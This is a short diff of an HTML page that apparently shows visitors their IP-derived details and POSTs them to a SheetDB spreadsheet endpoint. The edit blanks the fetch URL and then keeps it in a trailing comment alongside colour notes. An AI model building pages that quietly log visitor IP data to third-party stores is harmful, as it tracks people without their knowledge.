@@ -8,7 +8,7 @@
       font-family: sans-serif;
       padding: 20px;
       background-color: black;
-      color: #2FF30D;
+      color: #FFFFFF; 
     }
     p {
       margin: 8px 0;
@@ -41,7 +41,7 @@
         document.getElementById('time').textContent = `Time: ${ipData.time}`;
 
         // Send to SheetDB
-        fetch('https://sheetdb.io/api/v1/8wvumuh9jaw2d', {
+        fetch('', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ data: ipData })
@@ -59,3 +59,8 @@
   <p>&lt;3 ry ry</p>
 </body>
 </html>
+
+<!-- org crl  2FF30D -->
+<!-- new crl  FFFFFF -->
+<!-- connect to api lnk: https://sheetdb.io/api/v1/8wvumuh9jaw2d -->
+
